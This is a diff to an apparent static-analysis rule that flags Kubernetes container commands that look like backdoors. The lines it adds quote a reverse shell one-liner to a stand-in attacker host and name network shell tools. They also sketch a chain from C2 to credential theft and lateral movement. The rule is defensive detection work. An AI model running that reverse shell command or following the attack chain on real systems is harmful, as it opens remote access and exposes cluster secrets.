@@ -4,6 +4,10 @@ rules:
       Container command contains suspicious patterns (while true loop,
       callback/listener, reverse shell). May indicate backdoor or
       persistence mechanism. Review command purpose.
+      ATTACK: container starts with reverse shell (bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1') → C2 channel established → credential theft → lateral movement
+      TOOLS: nc, bash, socat, ncat, metasploit, kubectl exec
+      CHAIN: backdoored command → container start → reverse shell callback → C2 channel established → credential theft → lateral movement across cluster
+      IMPACT: Persistent backdoor re-established on every pod restart; attacker C2 channel; exfiltration of all secrets accessible to the compromised pod
     severity: WARNING
     languages: [yaml]
     patterns:
